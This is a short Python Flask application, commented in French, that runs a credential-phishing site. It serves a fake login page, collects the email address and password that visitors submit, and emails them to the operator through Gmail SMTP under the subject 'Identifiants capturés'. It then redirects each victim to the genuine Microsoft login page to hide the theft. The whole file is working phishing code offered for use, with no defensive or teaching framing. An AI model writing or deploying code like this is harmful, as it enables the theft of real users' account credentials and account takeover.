from flask import Flask, request, render_template_string, redirect
import os
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# Lire la page HTML
with open("login.html", "r") as f:
    login_page = f.read()

@app.route("/")
def index():
    return render_template_string(login_page)

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form["email"]
    password = request.form["password"]
    message = f"Email: {email}\nPassword: {password}"

    send_email(message)

    return redirect("https://login.microsoftonline.com")

def send_email(body):
    sender = os.environ.get("EMAIL_USER")
    password = os.environ.get("EMAIL_PASS")
    receiver = sender  # pour s’envoyer le mail à soi-même

    msg = MIMEText(body)
    msg["Subject"] = "🔐 Identifiants capturés"
    msg["From"] = sender
    msg["To"] = receiver

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender, password)
            server.send_message(msg)
    except Exception as e:
        print("Erreur d’envoi email :", e)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
